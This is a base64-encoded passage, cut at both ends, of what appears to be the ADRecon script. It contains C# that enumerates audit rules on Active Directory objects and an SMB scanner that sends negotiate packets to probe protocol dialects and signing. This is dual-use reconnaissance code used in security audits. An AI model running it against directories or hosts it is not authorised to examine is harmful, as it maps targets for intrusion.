YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkT2JqZWN0ID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBudFNlY3VyaXR5RGVzY3JpcHRvciA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE5hbWUgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBUeXBlID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBMaXN0PFBTT2JqZWN0PiBTQUNMTGlzdCA9IG5ldyBMaXN0PFBTT2JqZWN0PigpOwoKICAgICAgICAgICAgICAgICAgICBOYW1lID0gQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5Qcm9wZXJ0aWVzWyJuYW1lIl1bMF0pOwoKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuUHJvcGVydGllc1sib2JqZWN0Y2xhc3MiXVtBZE9iamVjdC5Qcm9wZXJ0aWVzWyJvYmplY3RjbGFzcyJdLkNvdW50LTFdKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVzZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJVc2VyIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJjb21wdXRlciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkNvbXB1dGVyIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJncm91cCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkdyb3VwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJjb250YWluZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJDb250YWluZXIiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImdyb3VwUG9saWN5Q29udGFpbmVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiR1BPIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSBDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0LlByb3BlcnRpZXNbImRpc3BsYXluYW1lIl1bMF0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgIm9yZ2FuaXphdGlvbmFsVW5pdCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIk9VIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJkb21haW5ETlMiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJEb21haW4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5Qcm9wZXJ0aWVzWyJvYmplY3RjbGFzcyJdW0FkT2JqZWN0LlByb3BlcnRpZXNbIm9iamVjdGNsYXNzIl0uQ291bnQtMV0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAvLyBXaGVuIHRoZSB1c2VyIGlzIG5vdCBhbGxvd2VkIHRvIHF1ZXJ5IHRoZSBudHNlY3VyaXR5ZGVzY3JpcHRvciBhdHRyaWJ1dGUuCiAgICAgICAgICAgICAgICAgICAgaWYgKEFkT2JqZWN0LlByb3BlcnRpZXNbIm50c2VjdXJpdHlkZXNjcmlwdG9yIl0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG50U2VjdXJpdHlEZXNjcmlwdG9yID0gKGJ5dGVbXSkgQWRPYmplY3QuUHJvcGVydGllc1sibnRzZWN1cml0eWRlc2NyaXB0b3IiXVswXTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5RW50cnkgQWRPYmplY3RFbnRyeSA9ICgoU2VhcmNoUmVzdWx0KXJlY29yZCkuR2V0RGlyZWN0b3J5RW50cnkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgbnRTZWN1cml0eURlc2NyaXB0b3IgPSAoYnl0ZVtdKSBBZE9iamVjdEVudHJ5Lk9iamVjdFNlY3VyaXR5LkdldFNlY3VyaXR5RGVzY3JpcHRvckJpbmFyeUZvcm0oKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKG50U2VjdXJpdHlEZXNjcmlwdG9yICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEaXJlY3RvcnlPYmplY3RTZWN1cml0eSBEaXJPYmpTZWMgPSBuZXcgQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgRGlyT2JqU2VjLlNldFNlY3VyaXR5RGVzY3JpcHRvckJpbmFyeUZvcm0obnRTZWN1cml0eURlc2NyaXB0b3IpOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRob3JpemF0aW9uUnVsZUNvbGxlY3Rpb24gQXVkaXRSdWxlcyA9IChBdXRob3JpemF0aW9uUnVsZUNvbGxlY3Rpb24pIERpck9ialNlYy5HZXRBdWRpdFJ1bGVzKHRydWUsdHJ1ZSx0eXBlb2YoU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoQWN0aXZlRGlyZWN0b3J5QXVkaXRSdWxlIFJ1bGUgaW4gQXVkaXRSdWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIElkZW50aXR5UmVmZXJlbmNlID0gQ29udmVydC5Ub1N0cmluZyhSdWxlLklkZW50aXR5UmVmZXJlbmNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IE9iamVjdE9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIENsZWFuU3RyaW5nKE5hbWUpKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJUeXBlIiwgVHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0VHlwZU5hbWUiLCBMREFQQ2xhc3MuR1VJRHNbQ29udmVydC5Ub1N0cmluZyhSdWxlLk9iamVjdFR5cGUpXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkT2JqZWN0VHlwZU5hbWUiLCBMREFQQ2xhc3MuR1VJRHNbQ29udmVydC5Ub1N0cmluZyhSdWxlLkluaGVyaXRlZE9iamVjdFR5cGUpXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWN0aXZlRGlyZWN0b3J5UmlnaHRzIiwgUnVsZS5BY3RpdmVEaXJlY3RvcnlSaWdodHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIklkZW50aXR5UmVmZXJlbmNlTmFtZSIsIExEQVBDbGFzcy5BZFNJRERpY3Rpb25hcnkuQ29udGFpbnNLZXkoSWRlbnRpdHlSZWZlcmVuY2UpID8gTERBUENsYXNzLkFkU0lERGljdGlvbmFyeVtJZGVudGl0eVJlZmVyZW5jZV0gOiBJZGVudGl0eVJlZmVyZW5jZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQXVkaXRGbGFncyIsIFJ1bGUuQXVkaXRGbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0RmxhZ3MiLCBSdWxlLk9iamVjdEZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZUZsYWdzIiwgUnVsZS5Jbmhlcml0YW5jZUZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZVR5cGUiLCBSdWxlLkluaGVyaXRhbmNlVHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkIiwgUnVsZS5Jc0luaGVyaXRlZCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJvcGFnYXRpb25GbGFncyIsIFJ1bGUuUHJvcGFnYXRpb25GbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0VHlwZSIsIFJ1bGUuT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkT2JqZWN0VHlwZSIsIFJ1bGUuSW5oZXJpdGVkT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSWRlbnRpdHlSZWZlcmVuY2UiLCBSdWxlLklkZW50aXR5UmVmZXJlbmNlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTQUNMTGlzdC5BZGQoIE9iamVjdE9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gU0FDTExpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvL1RoZSBpbnRlcmZhY2UgYW5kIGltcGxtZW50YXRpb24gY2xhc3MgdXNlZCB0byBoYW5kbGUgdGhlIHJlc3VsdHMgKHRoaXMgaW1wbGVtZW50YXRpb24ganVzdCB3cml0ZXMgdGhlIHN0cmluZ3MgdG8gYSBmaWxlKQoKICAgICAgICBpbnRlcmZhY2UgSVJlc3VsdHNIYW5kbGVyCiAgICAgICAgewogICAgICAgICAgICB2b2lkIHByb2Nlc3NSZXN1bHRzKE9iamVjdFtdIHQpOwoKICAgICAgICAgICAgT2JqZWN0W10gZmluYWxpc2UoKTsKICAgICAgICB9CgogICAgICAgIGNsYXNzIFNpbXBsZVJlc3VsdHNIYW5kbGVyIDogSVJlc3VsdHNIYW5kbGVyCiAgICAgICAgewogICAgICAgICAgICBwcml2YXRlIE9iamVjdCBsb2NrT2JqID0gbmV3IE9iamVjdCgpOwogICAgICAgICAgICBwcml2YXRlIExpc3Q8T2JqZWN0PiBwcm9jZXNzZWQgPSBuZXcgTGlzdDxPYmplY3Q+KCk7CgogICAgICAgICAgICBwdWJsaWMgU2ltcGxlUmVzdWx0c0hhbmRsZXIoKQogICAgICAgICAgICB7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHB1YmxpYyB2b2lkIHByb2Nlc3NSZXN1bHRzKE9iamVjdFtdIHJlc3VsdHMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGxvY2sgKGxvY2tPYmopCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3VsdHMuTGVuZ3RoICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHJlc3VsdHMuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NlZC5BZGQoKFBTT2JqZWN0KXJlc3VsdHNbaV0pOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBwdWJsaWMgT2JqZWN0W10gZmluYWxpc2UoKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm4gcHJvY2Vzc2VkLlRvQXJyYXkoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoiQAoKI0FkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkU291cmNlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyAoW1N5c3RlbS5TdHJpbmdbXV1AKChbc3lzdGVtLnJlZmxlY3Rpb24uYXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQiKSkuTG9jYXRpb24sKFtzeXN0ZW0ucmVmbGVjdGlvbi5hc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcyIpKS5Mb2NhdGlvbikpCgojIG1vZGlmaWVkIHZlcnNpb24gZnJvbSBodHRwczovL2dpdGh1Yi5jb20vdmxldG91eC9TbWJTY2FubmVyL2Jsb2IvbWFzdGVyL3NtYnNjYW5uZXIucHMxCiRQaW5nQ2FzdGxlU01CU2Nhbm5lclNvdXJjZSA9IEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uTmV0LlNvY2tldHM7CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb247CgpuYW1lc3BhY2UgQURSZWNvbgp7CiAgICBwdWJsaWMgY2xhc3MgUGluZ0Nhc3RsZVNjYW5uZXJzU01CU2Nhbm5lcgoJewogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5FeHBsaWNpdCldCgkJc3RydWN0IFNNQl9IZWFkZXIgewoJCQlbRmllbGRPZmZzZXQoMCldCgkJCXB1YmxpYyBVSW50MzIgUHJvdG9jb2w7CgkJCVtGaWVsZE9mZnNldCg0KV0KCQkJcHVibGljIGJ5dGUgQ29tbWFuZDsKCQkJW0ZpZWxkT2Zmc2V0KDUpXQoJCQlwdWJsaWMgaW50IFN0YXR1czsKCQkJW0ZpZWxkT2Zmc2V0KDkpXQoJCQlwdWJsaWMgYnl0ZSAgRmxhZ3M7CgkJCVtGaWVsZE9mZnNldCgxMCldCgkJCXB1YmxpYyBVSW50MTYgRmxhZ3MyOwoJCQlbRmllbGRPZmZzZXQoMTIpXQoJCQlwdWJsaWMgVUludDE2IFBJREhpZ2g7CgkJCVtGaWVsZE9mZnNldCgxNCldCgkJCXB1YmxpYyBVSW50NjQgU2VjdXJpdHlGZWF0dXJlczsKCQkJW0ZpZWxkT2Zmc2V0KDIyKV0KCQkJcHVibGljIFVJbnQxNiBSZXNlcnZlZDsKCQkJW0ZpZWxkT2Zmc2V0KDI0KV0KCQkJcHVibGljIFVJbnQxNiBUSUQ7CgkJCVtGaWVsZE9mZnNldCgyNildCgkJCXB1YmxpYyBVSW50MTYgUElETG93OwoJCQlbRmllbGRPZmZzZXQoMjgpXQoJCQlwdWJsaWMgVUludDE2IFVJRDsKCQkJW0ZpZWxkT2Zmc2V0KDMwKV0KCQkJcHVibGljIFVJbnQxNiBNSUQ7CgkJfTsKCQkvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjMjQ2NTI5LmFzcHgKCQlbU3RydWN0TGF5b3V0KExheW91dEtpbmQuRXhwbGljaXQpXQoJCXN0cnVjdCBTTUIyX0hlYWRlciB7CgkJCVtGaWVsZE9mZnNldCgwKV0KCQkJcHVibGljIFVJbnQzMiBQcm90b2NvbElkOwoJCQlbRmllbGRPZmZzZXQoNCldCgkJCXB1YmxpYyBVSW50MTYgU3RydWN0dXJlU2l6ZTsKCQkJW0ZpZWxkT2Zmc2V0KDYpXQoJCQlwdWJsaWMgVUludDE2IENyZWRpdENoYXJnZTsKCQkJW0ZpZWxkT2Zmc2V0KDgpXQoJCQlwdWJsaWMgVUludDMyIFN0YXR1czsgLy8gdG8gZG8gU01CMwoJCQlbRmllbGRPZmZzZXQoMTIpXQoJCQlwdWJsaWMgVUludDE2IENvbW1hbmQ7CgkJCVtGaWVsZE9mZnNldCgxNCldCgkJCXB1YmxpYyBVSW50MTYgQ3JlZGl0UmVxdWVzdF9SZXNwb25zZTsKCQkJW0ZpZWxkT2Zmc2V0KDE2KV0KCQkJcHVibGljIFVJbnQzMiBGbGFnczsKCQkJW0ZpZWxkT2Zmc2V0KDIwKV0KCQkJcHVibGljIFVJbnQzMiBOZXh0Q29tbWFuZDsKCQkJW0ZpZWxkT2Zmc2V0KDI0KV0KCQkJcHVibGljIFVJbnQ2NCBNZXNzYWdlSWQ7CgkJCVtGaWVsZE9mZnNldCgzMildCgkJCXB1YmxpYyBVSW50MzIgUmVzZXJ2ZWQ7CgkJCVtGaWVsZE9mZnNldCgzNildCgkJCXB1YmxpYyBVSW50MzIgVHJlZUlkOwoJCQlbRmllbGRPZmZzZXQoNDApXQoJCQlwdWJsaWMgVUludDY0IFNlc3Npb25JZDsKCQkJW0ZpZWxkT2Zmc2V0KDQ4KV0KCQkJcHVibGljIFVJbnQ2NCBTaWduYXR1cmUxOwoJCQlbRmllbGRPZmZzZXQoNTYpXQoJCQlwdWJsaWMgVUludDY0IFNpZ25hdHVyZTI7CgkJfQogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5FeHBsaWNpdCldCgkJc3RydWN0IFNNQjJfTmVnb3RpYXRlUmVxdWVzdAoJCXsKCQkJW0ZpZWxkT2Zmc2V0KDApXQoJCQlwdWJsaWMgVUludDE2IFN0cnVjdHVyZVNpemU7CgkJCVtGaWVsZE9mZnNldCgyKV0KCQkJcHVibGljIFVJbnQxNiBEaWFsZWN0Q291bnQ7CgkJCVtGaWVsZE9mZnNldCg0KV0KCQkJcHVibGljIFVJbnQxNiBTZWN1cml0eU1vZGU7CgkJCVtGaWVsZE9mZnNldCg2KV0KCQkJcHVibGljIFVJbnQxNiBSZXNlcnZlZDsKCQkJW0ZpZWxkT2Zmc2V0KDgpXQoJCQlwdWJsaWMgVUludDMyIENhcGFiaWxpdGllczsKCQkJW0ZpZWxkT2Zmc2V0KDEyKV0KCQkJcHVibGljIEd1aWQgQ2xpZW50R3VpZDsKCQkJW0ZpZWxkT2Zmc2V0KDI4KV0KCQkJcHVibGljIFVJbnQ2NCBDbGllbnRTdGFydFRpbWU7CgkJCVtGaWVsZE9mZnNldCgzNildCgkJCXB1YmxpYyBVSW50MTYgRGlhbGVjdFRvVGVzdDsKCQl9CgkJY29uc3QgaW50IFNNQl9DT01fTkVHT1RJQVRFCT0gMHg3MjsKCQljb25zdCBpbnQgU01CMl9ORUdPVElBVEUgPSAwOwoJCWNvbnN0IGludCBTTUJfRkxBR1NfQ0FTRV9JTlNFTlNJVElWRSA9IDB4MDg7CgkJY29uc3QgaW50IFNNQl9GTEFHU19DQU5PTklDQUxJWkVEX1BBVEhTID0gMHgxMDsKCQljb25zdCBpbnQgU01CX0ZMQUdTMl9MT05HX05BTUVTCQkJCQk9IDB4MDAwMTsKCQljb25zdCBpbnQgU01CX0ZMQUdTMl9FQVMJCQkJCQkJPSAweDAwMDI7CgkJY29uc3QgaW50IFNNQl9GTEFHUzJfU0VDVVJJVFlfU0lHTkFUVVJFX1JFUVVJUkVECT0gMHgwMDEwCTsKCQljb25zdCBpbnQgU01CX0ZMQUdTMl9JU19MT05HX05BTUUJCQkJCT0gMHgwMDQwOwoJCWNvbnN0IGludCBTTUJfRkxBR1MyX0VTUwkJCQkJCQk9IDB4MDgwMDsKCQljb25zdCBpbnQgU01CX0ZMQUdTMl9OVF9TVEFUVVMJCQkJCT0gMHg0MDAwOwoJCWNvbnN0IGludCBTTUJfRkxBR1MyX1VOSUNPREUJCQkJCQk9IDB4ODAwMDsKCQljb25zdCBpbnQgU01CX0RCX0ZPUk1BVF9ESUFMRUNUID0gMHgwMjsKCQlzdGF0aWMgYnl0ZVtdIEdlbmVyYXRlU21iSGVhZGVyRnJvbUNvbW1hbmQoYnl0ZSBjb21tYW5kKQoJCXsKCQkJU01CX0hlYWRlciBoZWFkZXIgPSBuZXcgU01CX0hlYWRlcigpOwoJCQloZWFkZXIuUHJvdG9jb2wgPSAweDQyNEQ1M0ZGOwoJCQloZWFkZXIuQ29tbWFuZCA9IGNvbW1hbmQ7CgkJCWhlYWRlci5TdGF0dXMgPSAwOwoJCQloZWFkZXIuRmxhZ3MgPSBTTUJfRkxBR1NfQ0FTRV9JTlNFTlNJVElWRSB8IFNNQl9GTEFHU19DQU5PTklDQUxJWkVEX1BBVEhTOwoJCQloZWFkZXIuRmxhZ3MyID0gU01CX0ZMQUdTMl9MT05HX05BTUVTIHwgU01CX0ZMQUdTMl9FQVMgfCBTTUJfRkxBR1MyX1NFQ1VSSVRZX1NJR05BVFVSRV9SRVFVSVJFRCB8IFNNQl9GTEFHUzJfSVNfTE9OR19OQU1FIHwgU01CX0ZMQUdTMl9FU1MgfCBTTUJfRkxBR1MyX05UX1NUQVRVUyB8IFNNQl9GTEFHUzJfVU5JQ09ERTsKCQkJaGVhZGVyLlBJREhpZ2ggPSAwOwoJCQloZWFkZXIuU2VjdXJpdHlGZWF0dXJlcyA9IDA7CgkJCWhlYWRlci5SZXNlcnZlZCA9IDA7CgkJCWhlYWRlci5USUQgPSAweGZmZmY7CgkJCWhlYWRlci5QSURMb3cgPSAweEZFRkY7CgkJCWhlYWRlci5VSUQgPSAwOwoJCQloZWFkZXIuTUlEID0gMDsKCQkJcmV0dXJuIGdldEJ5dGVzKGhlYWRlcik7CgkJfQoJCXN0YXRpYyBieXRlW10gR2VuZXJhdGVTbWIySGVhZGVyRnJvbUNvbW1hbmQoYnl0ZSBjb21tYW5kKQoJCXsKCQkJU01CMl9IZWFkZXIgaGVhZGVyID0gbmV3IFNNQjJfSGVhZGVyKCk7CgkJCWhlYWRlci5Qcm90b2NvbElkID0gMHg0MjRENTNGRTsKCQkJaGVhZGVyLkNvbW1hbmQgPSBjb21tYW5kOwoJCQloZWFkZXIuU3RydWN0dXJlU2l6ZSA9IDY0OwoJCQloZWFkZXIuQ29tbWFuZCA9IGNvbW1hbmQ7CgkJCWhlYWRlci5NZXNzYWdlSWQgPSAwOwoJCQloZWFkZXIuUmVzZXJ2ZWQgPSAweEZFRkY7CgkJCXJldHVybiBnZXRCeXRlcyhoZWFkZXIpOwoJCX0KCQlzdGF0aWMgYnl0ZVtdIGdldEJ5dGVzKG9iamVjdCBzdHJ1Y3R1cmUpCgkJewoJCQlpbnQgc2l6ZSA9IE1hcnNoYWwuU2l6ZU9mKHN0cnVjdHVyZSk7CgkJCWJ5dGVbXSBhcnIgPSBuZXcgYnl0ZVtzaXplXTsKCQkJSW50UHRyIHB0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKHNpemUpOwoJCQlNYXJzaGFsLlN0cnVjdHVyZVRvUHRyKHN0cnVjdHVyZSwgcHRyLCB0cnVlKTsKCQkJTWFyc2hhbC5Db3B5KHB0ciwgYXJyLCAwLCBzaXplKTsKCQkJTWFyc2hhbC5GcmVlSEdsb2JhbChwdHIpOwoJCQlyZXR1cm4gYXJyOwoJCX0KCQlzdGF0aWMgYnl0ZVtdIGdldERpYWxlY3Qoc3RyaW5nIGRpYWxlY3QpCgkJewoJCQlieXRlW10gZGlhbGVjdEJ5dGVzID0gRW5jb2RpbmcuQVNDSUkuR2V0Qnl0ZXMoZGlhbGVjdCk7CgkJCWJ5dGVbXSBvdXRwdXQgPSBuZXcgYnl0ZVtkaWFsZWN0Qnl0ZXMuTGVuZ3RoICsgMl07CgkJCW91dHB1dFswXSA9IDI7CgkJCW91dHB1dFtvdXRwdXQuTGVuZ3RoIC0gMV0gPSAwOwoJCQlBcnJheS5Db3B5KGRpYWxlY3RCeXRlcywgMCwgb3V0cHV0LCAxLCBkaWFsZWN0Qnl0ZXMuTGVuZ3RoKTsKCQkJcmV0dXJuIG91dHB1dDsKCQl9CgkJc3RhdGljIGJ5dGVbXSBHZXROZWdvdGlhdGVNZXNzYWdlKGJ5dGVbXSBkaWFsZWN0KQoJCXsKCQkJYnl0ZVtdIG91dHB1dCA9IG5ldyBieXRlW2RpYWxlY3QuTGVuZ3RoICsgM107CgkJCW91dHB1dFswXSA9IDA7CgkJCW91dHB1dFsxXSA9IChieXRlKSBkaWFsZWN0Lkxlbmd0aDsKCQkJb3V0cHV0WzJdID0gMDsKCQkJQXJyYXkuQ29weShkaWFsZWN0LCAwLCBvdXRwdXQsIDMsIGRpYWxlY3QuTGVuZ3RoKTsKCQkJcmV0dXJuIG91dHB1dDsKCQl9CgkJLy8gTVMtU01CMiAgMi4yLjMgU01CMiBORUdPVElBVEUgUmVxdWVzdAoJCXN0YXRpYyBieXRlW10gR2V0TmVnb3RpYXRlTWVzc2FnZVNtYnYyKGludCBEaWFsZWN0VG9UZXN0KQoJCXsKCQkJU01CMl9OZWdvdGlhdGVSZXF1ZXN0IHJlcXVlc3QgPSBuZXcgU01CMl9OZWdvdGlhdGVSZXF1ZXN0KCk7CgkJCXJlcXVlc3QuU3RydWN0dXJlU2l6ZSA9IDM2OwoJCQlyZXF1ZXN0LkRpYWxlY3RDb3VudCA9IDE7CgkJCXJlcXVlc3QuU2VjdXJpdHlNb2RlID0gMTsgLy8gc2lnbmluZyBlbmFibGVkCgkJCXJlcXVlc3QuQ2xpZW50R3VpZCA9IEd1aWQuTmV3R3VpZCgpOwoJCQlyZXF1ZXN0LkRpYWxlY3RUb1Rlc3QgPSAoVUludDE2KSBEaWFsZWN0VG9UZXN0OwoJCQlyZXR1cm4gZ2V0Qnl0ZXMocmVxdWVzdCk7CgkJfQoJCXN0YXRpYyBieXRlW10gR2V0TmVnb3RpYXRlUGFja2V0KGJ5dGVbXSBoZWFkZXIsIGJ5dGVbXSBzbWJQYWNrZXQpCgkJewoJCQlieXRlW10gb3V0cHV0ID0gbmV3IGJ5dGVbc21iUGFja2V0Lkxlbmd0aCArIGhlYWRlci5MZW5ndGggKyA0XTsKCQkJb3V0cHV0WzBdID0gMDsKCQkJb3V0cHV0WzFdID0gMDsKCQkJb3V0cHV0WzJdID0gMDsKCQkJb3V0cHV0WzNdID0gKGJ5dGUpKHNtYlBhY2tldC5MZW5ndGggKyBoZWFkZXIuTGVuZ3RoKTsKCQkJQXJyYXkuQ29weShoZWFkZXIsIDAsIG91dHB1dCwgNCwgaGVhZGVyLkxlbmd0aCk7CgkJCUFycmF5LkNvcHkoc21iUGFja2V0LCAwLCBvdXRwdXQsIDQgKyBoZWFkZXIuTGVuZ3RoLCBzbWJQYWNrZXQuTGVuZ3RoKTsKCQkJcmV0dXJuIG91dHB1dDsKCQl9CgkJcHVibGljIHN0YXRpYy